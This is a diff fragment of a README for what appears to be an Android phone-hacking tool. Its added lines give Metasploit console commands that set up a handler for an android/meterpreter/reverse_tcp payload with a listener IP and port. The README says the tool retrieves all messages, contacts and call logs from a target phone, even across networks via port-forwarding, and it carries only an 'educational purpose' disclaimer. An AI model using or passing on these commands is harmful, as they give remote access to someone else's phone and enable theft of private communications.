@@ -37,6 +37,12 @@ and press y when ask to press
 run `msfconsole`
 ```bash
 msfconsole
+db_status
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set lhost 192.168.29.29 (your local ip)
+set lport 6767
+exploit
 ```
 ## cmd to generate payload
 ```
@@ -63,6 +69,7 @@ LPORT: you can use any port
 ## How it is useful?
 
 * It is used to retrieve all the messages, contacts, call-logs from the Target Mobile on the same or different Network. However you need to learn how to do port-forwarding in order to do it on different network.
+* Use help command to know all the commands
 
 ## Warning
 ***This tool is only for educational purpose. If you use this tool for other purposes except education we will not be responsible in such cases.***
